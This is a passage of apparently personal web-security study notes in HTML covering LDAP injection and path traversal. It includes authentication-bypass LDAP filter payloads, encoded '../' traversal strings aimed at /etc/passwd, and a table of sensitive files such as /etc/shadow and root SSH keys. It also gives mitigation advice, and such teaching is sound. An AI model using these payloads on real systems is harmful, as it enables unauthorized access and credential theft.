            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>
          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">
                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Lightweight Directory Access Protocol &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Protocol used to query and modify directory services over TCP/IP</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">LDAP can also be used for management and authentication tasks.</li>
                  <li style="margin-bottom: 10px;">LDAP is a protocol for accessing directory services; it is not a storage mechanism in itself.</li>
                  <li style="margin-bottom: 10px;">LDAP is object-oriented, meaning that every entry is an instance of an object and must correspond to rules.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Directory Services &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Database-Like system store and organize data in hierarchical structure.</li>
                  <li style="margin-bottom: 10px;">Used in enterprise environments to manage and provide access to information such as users, accounts, groups, etc.</li>
                  <li style="margin-bottom: 10px;"><strong>Common:</strong> Active Directory (Microsoft), OpenLDAP.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How Web Application use LDAP &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Authenticate Users:</strong> Validate usernames and passwords against directory entries.</li>
                  <li style="margin-bottom: 10px;"><strong>Authorize Access:</strong> Check user roles and permissions for specific resources.</li>
                  <li style="margin-bottom: 10px;"><strong>Query Directory Data:</strong> Retrieve user or organizational information from the directory.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">LDAP Directory Structure &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Root of the Tree:</strong> Topmost entry (e.g., dc=example,dc=com).</li>
                  <li style="margin-bottom: 10px;"><strong>Organizational Units (OU):</strong> Logical containers (e.g., ou=Users).</li>
                  <li style="margin-bottom: 10px;"><strong>Entries:</strong> Individual records represented by a Distinguished Name (DN) (e.g., cn=John Doe,ou=Users,dc=example,dc=com).</li>
                  <li style="margin-bottom: 10px;"><strong>Attributes:</strong> Key-value pairs (cn=common name, sn=surname, uid=user ID, mail=email, objectClass).</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; LDAP Syntax &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Operators:</strong> <code>=</code> (equal), <code>|</code> (logical OR), <code>&amp;</code> (logical AND), <code>!</code> (logical NOT), <code>*</code> (wildcard).</li>
                  <li style="margin-bottom: 10px;">Example: <code>(&amp;(sn=a*)(cn=b*))</code> looks for records where surname starts with "a" AND common name starts with "b".</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; LDAP Injection &rarr;</h2>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <p style="font-size: 1.2rem; margin: 0;"><strong>&rarr; Web application vulnerability occur when user-input not validated or sanitized before used in LDAP query, allowing an attacker to manipulate the LDAP query.</strong></p>
                </div>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Impact:</strong> Unauthorized access, bypass authentication, extract sensitive information.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Causes of LDAP Injection &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Improper Input Validation:</strong> Accepting user input directly.</li>
                  <li style="margin-bottom: 10px;"><strong>Concatenating User Input into Queries:</strong> Dynamically building queries using unsanitized input.</li>
                  <li style="margin-bottom: 10px;"><strong>Lack of Escape Mechanisms:</strong> Special characters like <code>*</code>, <code>(</code>, <code>)</code>, or <code>|</code> are not properly escaped.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Examples of LDAP Injection &rarr;</h2>
                
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Bypass Authentication &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">(&amp; (uid={username}) (userPassword={password}) )</code>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">If input not sanitized, an attacker can input <code>*)(uid=*</code> into the username field:</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">(&amp;(uid=*)(uid=*)(userPassword={password}))</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">This forces the first condition to be closed early, adding a wildcard filter that matches any user and bypassing the password check entirely.</p>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; Wildcard Injection &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">Using a <code>*</code> for userInput could force the query to ignore specific usernames and focus instead on the password check. If both fields receive a wildcard, the authentication succeeds for the first record fetched.</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">(&amp;(uid=a*)(userPassword=*))</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Tautology-Based Injection &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">Inserting conditions into an LDAP query that are inherently true. For example, injecting <code>*)(|(&amp;</code> for username transforms the query:</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">(&amp;(uid=*)(|(&amp;)(userPassword=pwd)))</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4 &rarr; NULL bind authentication bypass &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">Some LDAP servers authorize <code>NULL</code> bind. If completely empty parameters are sent, the server might bind connection, deceiving the PHP code into thinking credentials are correct.</p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Blind LDAP Injection &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attacker doesn't receive direct output from the injected payload. They must infer information based on the application's behavior.</li>
                  <li style="margin-bottom: 10px;"><strong>Boolean Exploitation:</strong> Injecting conditions evaluated as true or false and observing responses. E.g. <code>search=)(sn=admin)(password=dsy365gd</code>.</li>
                  <li style="margin-bottom: 10px;"><strong>Error-Based Inference:</strong> Specific injections triggering error messages or peculiar application behaviour.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/Writeups-2f427bcaaa968012b881d07258b43ee5?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Notes-2f127bcaaa9680dfbe36c53287c39dc2?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Tools-2f127bcaaa9680fb845fff2fd443175d?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>
              </div>
            </div>
          </div>
        </article>

          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Server-Side
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text" style="background: rgba(115, 128, 206, 0.05); box-shadow: inset 0 2px 10px rgba(0,0,0,0.02); padding: 30px 25px 30px 45px; border-left: 5px solid #7380ce; border-radius: 0 12px 12px 0; margin-top: 15px;">
            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Path Traversal
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">

                    <h3 style="font-size: 1.4rem; margin-top: 0; color: var(--color-dark-varient, #4b5563);">&lt; Path <strong>Traversal</strong> &gt;</h3>
                    <h3 style="font-size: 1.4rem; margin-top: 15px; color: var(--color-dark-varient, #4b5563);">&lt; Directory <strong>Traversal</strong> &gt;</h3>
                    <h3 style="font-size: 1.4rem; margin-top: 15px; color: var(--color-dark-varient, #4b5563);">&lt; <strong>Directory Climbing Vulnerability</strong> &gt;</h3>

                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong><em>&rarr; Web Security Vulnerability that occur when web application allow unauthorized access to files and directories outside intended or authorized directory structure.</em></strong></p>
                    </div>

                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Application code and data.</li>
                      <li style="margin-bottom: 10px;">Credentials for back-end systems.</li>
                      <li style="margin-bottom: 10px;">Sensitive operating system files and configurations.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; <strong>lead</strong> to series <em><strong>Data Breaches</strong></em> and <em><strong>system compromised</strong></em> if not <em><strong>addressed/mitigated</strong></em></p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes &rarr;</h2>
                    
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Cause</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Description</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Example</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>1. Unvalidated User Input</strong></td>
                            <td style="padding: 15px;">File names or paths from user input are used directly to make paths.</td>
                            <td style="padding: 15px;"><code>GET /view?file=../../etc/passwd</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>2. Lack of Input Sanitization or Filtering</strong></td>
                            <td style="padding: 15px;">Application fails to strip dangerous sequences like <code>../</code>.</td>
                            <td style="padding: 15px;">Accepts <code>../../</code> without cleaning.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>3. Using User Input in File Paths</strong></td>
                            <td style="padding: 15px;">Concatenating paths from untrusted sources.</td>
                            <td style="padding: 15px;"><code>file = "/images/" + user_input</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>4. Poor Whitelisting/Blacklist Logic</strong></td>
                            <td style="padding: 15px;">Using a blacklist that can be bypassed (e.g., <code>..%2f</code>).</td>
                            <td style="padding: 15px;"><code>..%2f..%2fetc/passwd</code> bypasses filters</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>5. Insufficient Access Controls</strong></td>
                            <td style="padding: 15px;">App checks only file existence, not user permissions.</td>
                            <td style="padding: 15px;">Users can access other users' files.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>6. Misconfigured File Access Logic</strong></td>
                            <td style="padding: 15px;">Application trusts symbolic links or relative paths.</td>
                            <td style="padding: 15px;">Follows symlinks to sensitive files.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>7. Decoding Tricks Not Accounted For</strong></td>
                            <td style="padding: 15px;">App decodes URL-encoded input before checking.</td>
                            <td style="padding: 15px;"><code>..%252f..%252fetc%252fpasswd</code> double encoding</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>8. Running App with Excessive Privileges</strong></td>
                            <td style="padding: 15px;">App runs as root or full access user.</td>
                            <td style="padding: 15px;">Allows reading protected OS files.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>9. Failure to Canonicalize Paths</strong></td>
                            <td style="padding: 15px;">Paths aren't reduced to their simplest absolute form before validation.</td>
                            <td style="padding: 15px;"></td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><strong>10. URL Decoding Issues</strong></td>
                            <td style="padding: 15px;">Developers forget to decode URL-encoded input, allowing attackers to bypass checks using <code>%2e%2e%2f</code> instead of <code>../</code>.</td>
                            <td style="padding: 15px;"></td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><em><strong>improper handling of user input</strong></em>, especially when dealing with file or directory paths. This input could be obtained from URL parameters, user-generated content, or other sources.</li>
                      <li style="margin-bottom: 10px;">input is passed to a function such as <code>file_get_contents</code> in PHP. It's important to note that the function is not the main contributor to the vulnerability.</li>
                      <li style="margin-bottom: 10px;"><strong>Attacker Manipulation:</strong> An attacker takes advantage of lax input validation or insufficient sanitization of user inputs. They manipulate the input by adding special characters or sequences that trick the application into navigating to directories it shouldn't have access to.</li>
                      <li style="margin-bottom: 10px;"><strong>Traversing Directory Structure:</strong> By strategically placing ".." (dot-dot) or equivalent directory traversal sequences in the input, the attacker can move up the directory hierarchy. Each ".." signifies going up one level in the directory structure.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Goals &amp; Limitations &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;"><strong>main goal</strong> is allow access and read files and directories in unauthorized manner.</li>
                      <li style="margin-bottom: 10px;">if i access file same <code>&lt;shell.php&gt;</code> it display content of file, not execute it.</li>
                    </ol>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: #ef4444;">&#10060; <strong>Path Traversal <em>by itself</em> does NOT allow &rarr;</strong></h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Code execution</li>
                      <li style="margin-bottom: 10px;">Writing new files</li>
                      <li style="margin-bottom: 10px;">Uploading shells</li>
                      <li style="margin-bottom: 10px;">Privilege escalation</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Impact &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><strong>1 &rarr; unauthorized access to sensitive files and directories &rarr;</strong></h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong><em>&lt;Information Disclosure&gt; &rarr;</em></strong> Attackers can view, steal, or manipulate data they shouldn't have access to, such as user data, configuration files, application source code, or system files</p>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">User data (e.g., passwords, personal information)</li>
                      <li style="margin-bottom: 10px;">Configuration files (e.g., <code>.env</code>, <code>config.php</code>)</li>
                      <li style="margin-bottom: 10px;">Application source code</li>
                      <li style="margin-bottom: 10px;">System files such as <code>/etc/passwd</code> or <code>C:\Windows\System32\</code></li>
                    </ol>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><strong>2 &rarr; Data Leakage &rarr;</strong></h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The exposure of sensitive data can lead to data breaches and the leakage of confidential information. This can include user credentials, financial data, intellectual property, and more.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><strong>3 &rarr; System Compromise &rarr;</strong></h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">In some cases, directory traversal can lead to a complete compromise of the targeted system. Attackers may gain access to critical system files, potentially allowing them to execute arbitrary code, escalate privileges, or take control of the server.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><strong>4 &rarr; Authentication/Session Bypass &rarr;</strong></h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">If session tokens, API keys, or auth files are accessible:
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li style="margin-bottom: 5px;"><code>/var/www/app/.env</code> &rarr; environment variables with API keys</li>
                          <li style="margin-bottom: 5px;"><code>/etc/shadow</code> &rarr; password hashes</li>
                        </ul>
                      </li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&#128073; <strong>Impact</strong>: Attacker can impersonate users or admins.</p>

                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>Path Traversal by itself does not always lead to RCE</strong></p>
                      <p style="font-size: 1.2rem; margin-bottom: 10px;"><em>If path traversal is chained with other vulnerabilities (e.g., file upload, LFI), it can lead to:</em></p>
                      <ol style="font-size: 1.2rem; padding-left: 30px; margin: 0;">
                        <li style="margin-bottom: 5px;">Remote code execution (RCE)</li>
                        <li style="margin-bottom: 5px;">Privilege escalation</li>
                        <li style="margin-bottom: 5px;">Full control over the server</li>
                        <li style="margin-bottom: 5px;">Installation of web shells or malware</li>
                      </ol>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Prevent &rarr;</h2>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><em>1 &rarr; validate user input, sanitize and clear it before processing &rarr;</em></h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">DonÃ¢â‚¬â„¢t trust user input for file paths.</li>
                      <li style="margin-bottom: 10px;"><strong>Remove dangerous characters</strong> like:
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li style="margin-bottom: 5px;"><code>../</code> or <code>..\</code> (dot-dot sequences)</li>
                          <li style="margin-bottom: 5px;">Null bytes (<code>%00</code>)</li>
                          <li style="margin-bottom: 5px;">URL-encoded traversal (<code>..%2f</code>, <code>%252e%252e%252f</code>)</li>
                        </ul>
                      </li>
                      <li style="margin-bottom: 10px;">Use <strong>whitelisting</strong> instead of blacklisting:
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li style="margin-bottom: 5px;">Allow only known safe filenames (<code>about.html</code>, <code>contact.html</code>).</li>
                          <li style="margin-bottom: 5px;">Reject everything else.</li>
                        </ul>
                      </li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><em>2 &rarr; After validating the supplied input &rarr;</em></h3>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>append the input to the base directory</strong> and use a platform filesystem API to <strong>canonicalize</strong> the path. Verify that the canonicalized path starts with the expected base directory.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><em>3 &rarr; Use WAF and apply Least Privilege Principle &rarr;</em></h3>
                    
                    <div style="background-color: var(--color-dark, #1f2937); color: var(--color-white, #ffffff); padding: 25px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 30px 0;">
                      <ol style="padding-left: 20px; margin: 0;">
                        <li style="margin-bottom: 10px;"><strong>Define a trusted base directory</strong><br>e.g., <code>/var/www/files</code></li>
                        <li style="margin-bottom: 10px;"><strong>Append the user input to it</strong> (e.g., <code>report.txt</code>)</li>
                        <li style="margin-bottom: 10px;"><strong>Canonicalize</strong> (normalize/resolve symlinks, remove <code>..</code>, etc.)</li>
                        <li style="margin-bottom: 10px;"><strong>Verify</strong> the canonical path starts with the base directory<br>&rarr; This ensures the user didnÃ¢â‚¬â„¢t escape it.</li>
                      </ol>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Study Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/bypass-filters-22327bcaaa9680a38270d72773b3890f?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Bypass Filters <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerable-Codes-and-Mitigation-22327bcaaa96802983faca6b0d90a6c2?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vuln &amp; Mitigation <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-22627bcaaa968079b28ee4fe832b98d1?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes-26027bcaaa968058a4a6c99e426c9f59?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools-26027bcaaa96802698ebe1867acefc28?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Study-Resources-26027bcaaa9680709730c9b857b2831b?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Study Resources <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Common Locations &rarr;</h2>
                    
                    <div style="overflow-x: auto; margin-bottom: 40px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Location</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Description</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/etc/issue</code></td>
                            <td style="padding: 15px;">contains a message or system identification to be printed before the login prompt.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/etc/profile</code></td>
                            <td style="padding: 15px;">controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/proc/version</code></td>
                            <td style="padding: 15px;">specifies the version of the Linux kernel</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/etc/passwd</code></td>
                            <td style="padding: 15px;">has all registered users that have access to a system</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/etc/shadow</code></td>
                            <td style="padding: 15px;">contains information about the system's users' passwords</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/root/.bash_history</code></td>
                            <td style="padding: 15px;">contains the history commands for <code>root</code> user</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/var/log/dmessage</code></td>
                            <td style="padding: 15px;">contains global system messages, including the messages that are logged during system startup</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/var/mail/root</code></td>
                            <td style="padding: 15px;">all emails for <code>root</code> user</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/root/.ssh/id_rsa</code></td>
                            <td style="padding: 15px;">Private SSH keys for a root or any known valid user on the server</td>
                          </tr>
